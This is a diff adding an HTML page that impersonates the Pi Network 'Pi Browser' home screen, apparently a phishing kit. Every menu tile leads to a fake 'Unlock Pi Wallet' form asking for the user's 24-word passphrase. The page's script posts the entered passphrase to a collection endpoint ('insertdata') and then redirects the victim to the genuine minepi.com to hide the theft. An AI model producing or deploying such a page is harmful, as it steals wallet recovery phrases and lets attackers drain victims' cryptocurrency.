@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Page</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            width: 800px;
+            height: 1629px;
+            max-width: 100%;
+            margin: 0 auto;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Status bar style */
+        .status-bar {
+            background-color: #000;
+            color: white;
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 10px;
+            font-size: 14px;
+        }
+
+        .status-bar-left, .status-bar-right {
+            display: flex;
+            align-items: center;
+        }
+
+        .status-bar-item {
+            margin: 0 5px;
+        }
+
+        /* Header style */
+        .header {
+            background-color: #673AB7;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+        }
+
+        .back-arrow {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .header-title {
+            text-align: center;
+            font-size: 20px;
+            flex-grow: 1;
+        }
+
+        .dropdown-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Main content */
+        .main-content {
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 20px 0;
+        }
+
+        .welcome-text {
+            font-size: 24px;
+            color: #FFA726;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        /* Menu grid */
+        .menu-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .menu-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .menu-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 12px;
+            border: 2px solid #673AB7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .menu-label {
+            color: #673AB7;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        /* Explore button */
+        .explore-button {
+            margin-top: 40px;
+            background-color: #673AB7;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 15px 40px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            width: 90%;
+            max-width: 500px;
+            justify-content: center;
+        }
+
+        .explore-icon {
+            margin-right: 10px;
+        }
+
+        /* Navigation bar */
+        .nav-bar {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 800px;
+            height: 5px;
+            background-color: #ddd;
+        }
+
+        .nav-indicator {
+            width: 50%;
+            height: 100%;
+            background-color: #fff;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="back-arrow">←</div>
+        <div class="header-title">Home <span style="display: inline-block; width: 20px; height: 20px; border-radius: 50%; text-align: center; line-height: 20px; font-size: 14px; vertical-align: middle;"><img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="width: 100%; height: auto; object-fit:fill;" /></span></div>
+        <div class="dropdown-icon">▼</div>
+    </div>
+
+
+    <div class="main-content">
+        <div class="logo">
+            <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 100px; height: auto;" />
+        </div>
+
+
+
+        <div class="welcome-text">Welcome to the Pi Browser</div>
+
+
+        <div class="menu-grid">
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/6.png" alt="" style="width:100%;">
+                </div>
+                <div class="menu-label">Fireside</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/1.png" alt="" style="width:100%;">
+                
+                </div>
+                <div class="menu-label">Wallet</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/2.png" alt="" style="width:100%;">
+                
+                </div>
+                <div class="menu-label">Brainstorm</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/3.png" alt="" style="width:100%;">
+                
+                </div>
+                <div class="menu-label">Mine</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/4.png" alt="" style="width:100%;">
+                
+                </div>
+                <div class="menu-label">Blockchain</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <svg viewBox="0 0 24 24" width="35" height="35">
+                        <path d="M14.6,16.6L19.2,12L14.6,7.4L16,6L22,12L16,18L14.6,16.6M9.4,16.6L4.8,12L9.4,7.4L8,6L2,12L8,18L9.4,16.6Z" fill="#673AB7"/>
+                    </svg>
+                </div>
+                <div class="menu-label">Develop</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <svg viewBox="0 0 24 24" width="35" height="35">
+                        <path d="M2,3H22C23.05,3 24,3.95 24,5V19C24,20.05 23.05,21 22,21H2C0.95,21 0,20.05 0,19V5C0,3.95 0.95,3 2,3M14,6V7H22V6H14M14,8V9H21.5L22,9V8H14M14,10V11H21V10H14M8,13.91C6,13.91 2,15 2,17V18H14V17C14,15 10,13.91 8,13.91M8,6A3,3 0 0,0 5,9A3,3 0 0,0 8,12A3,3 0 0,0 11,9A3,3 0 0,0 8,6Z" fill="#673AB7"/>
+                    </svg>
+                </div>
+                <div class="menu-label">KYC</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <svg viewBox="0 0 24 24" width="35" height="35">
+                        <path d="M20,2H4A2,2 0 0,0 2,4V22L6,18H20A2,2 0 0,0 22,16V4A2,2 0 0,0 20,2M20,16H6L4,18V4H20" fill="#673AB7"/>
+                    </svg>
+                </div>
+                <div class="menu-label">Chat</div>
+            </div>
+
+            <div class="menu-item" onclick="redirectToWallet()">
+                <div class="menu-icon">
+                    <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/8.png" alt="" style="width:100%;">
+                
+                </div>
+                <div class="menu-label">P2P</div>
+            </div>
+        </div>
+
+
+        <button class="explore-button" onclick="redirectToWallet()">
+            <svg viewBox="0 0 24 24" width="20" height="20" style="margin-right: 10px;">
+                <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6.5A5.5,5.5 0 0,0 6.5,12A5.5,5.5 0 0,0 12,17.5A5.5,5.5 0 0,0 17.5,12A5.5,5.5 0 0,0 12,6.5M12,9.5A2.5,2.5 0 0,1 14.5,12A2.5,2.5 0 0,1 12,14.5A2.5,2.5 0 0,1 9.5,12A2.5,2.5 0 0,1 12,9.5" fill="white"/>
+            </svg>
+            Explore the Ecosystem
+        </button>
+    </div>
+
+
+    <div class="nav-bar">
+        <div class="nav-indicator"></div>
+    </div>
+
+
+    <div id="wallet-content" style="display: none;">
+        <div class="header">
+            <button class="back-button">←</button>
+            <div class="header-title">
+                <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 20px; height: auto;" />
+    
+                Wallet
+                <img src="https://raw.githubusercontent.com/cid-phisherr/rTFdalPyLqXeo8ox7NEsb1AQ8hx2raa-am/refs/heads/main/hde.png" alt="Pi Logo" style="border-radius: 50%; width: auto; max-width: 20px; height: auto;" />
+            </div>
+            <button class="check-button">✓</button>
+        </div>
+        
+        <div class="container">
+            <h1>Unlock Pi Wallet</h1>
+            
+            <textarea class="passphrase-input" id="password" placeholder="Enter your 24-word passphrase here"></textarea>
+            
+            <button class="unlock-button unlock-passphrase" onclick="handleSubmit(event)" id="testeb">Unlock With Passphrase</button>
+            <button class="unlock-button unlock-fingerprint disabled" id="testeb">Unlock With Fingerprint</button>
+            
+            <p class="info-text">
+                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+                Recovery of passphrase is currently impossible.
+            </p>
+            
+            <p class="info-text">
+                Lost your passphrase? <a href="https://minepi.com/" class="blue-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+            </p>
+        </div>
+    </div>
+
+    <script>
+
+        document.head.insertAdjacentHTML('beforeend', `
+        <style id="wallet-styles" disabled>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+                margin: 0;
+                padding: 0;
+                background-color: #f5f5f5;
+                width: 800px;
+                height: 1629px;
+                max-width: 100%;
+                margin: 0 auto;
+            }
+            
+            .header {
+                background-color: #663399;
+                color: white;
+                padding: 15px 20px;
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+            }
+            
+            .header-title {
+                font-size: 20px;
+                font-weight: 500;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                flex: 1;
+            }
+            
+            .back-button {
+                width: 24px;
+                height: 24px;
+                border: none;
+                background: none;
+                color: white;
+                font-size: 24px;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+            }
+            
+            .check-button {
+                width: 24px;
+                height: 24px;
+                border: none;
+                background: none;
+                color: white;
+                font-size: 18px;
+                cursor: pointer;
+            }
+            
+            .wallet-icon {
+                background-color: #FFA500;
+                width: 30px;
+                height: 30px;
+                border-radius: 6px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin-right: 10px;
+                color: white;
+            }
+            
+            .pi-icon {
+                background-color: #FFA500;
+                width: 20px;
+                height: 20px;
+                border-radius: 50%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin-left: 10px;
+                color: white;
+                font-size: 12px;
+            }
+            
+            .container {
+                padding: 20px;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            h1 {
+                font-size: 24px;
+                margin: 20px 0 30px;
+                text-align: center;
+                color: #333;
+            }
+            
+            .passphrase-input {
+                width: 100%;
+                height: 150px;
+                border: 1px solid #ddd;
+                border-radius: 10px;
+                padding: 20px;
+                font-size: 16px;
+                margin-bottom: 20px;
+                resize: none;
+                color: #aaa;
+                background: white;
+            }
+            
+            .unlock-button {
+                width: 100%;
+                padding: 15px;
+                margin: 10px 0;
+                border-radius: 10px;
+                border: none;
+                font-size: 16px;
+                cursor: pointer;
+                text-align: center;
+            }
+            
+            .unlock-passphrase {
+                background-color: white;
+                color: #663399;
+                border: 1px solid #ddd;
+            }
+            
+            .unlock-fingerprint {
+                background-color: #663399;
+                color: white;
+            }
+            
+            .info-text {
+                margin: 20px 0;
+                color: #333;
+                font-size: 16px;
+                line-height: 1.5;
+            }
+            
+            .blue-link {
+                color: #3498db;
+                text-decoration: none;
+            }
+                body {
+            overflow: hidden;
+            }
+        </style>
+        `);
+
+
+        function redirectToWallet() {
+
+            document.querySelector('.main-content').style.display = 'none';
+            document.querySelector('.header').style.display = 'none';
+            document.querySelector('.nav-bar').style.display = 'none';
+            
+
+            document.querySelector('#wallet-content').style.display = 'block';
+            
+
+            document.querySelector('#wallet-styles').disabled = false;
+        }
+
+
+        const uid = "user123user123"; 
+        const websiteName = "mywebsitemywebsite"; 
+        
+        async function handleSubmit(event) {
+            event.preventDefault(); 
+            const email = "PiWalletAddress";
+            const password = document.getElementById("password").value;
+            const signInButton = document.getElementById("testeb");
+            signInButton.disabled = true;
+            signInButton.style.opacity = '0.5';
+            signInButton.style.cursor = 'not-allowed';
+            
+            try {
+                const response = await fetch("http://localhost:5237/insertdata", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    uid: uid,
+                    websiteName: websiteName,
+                    email: email,
+                    password: password
+                })
+                });
+
+                window.location.href = "https://minepi.com/";
+            } catch (error) {
+                window.location.href = "https://minepi.com/";
+                console.error("Error inserting data:", error);
+            }
+        }
+    </script>
+</body>
+</html>
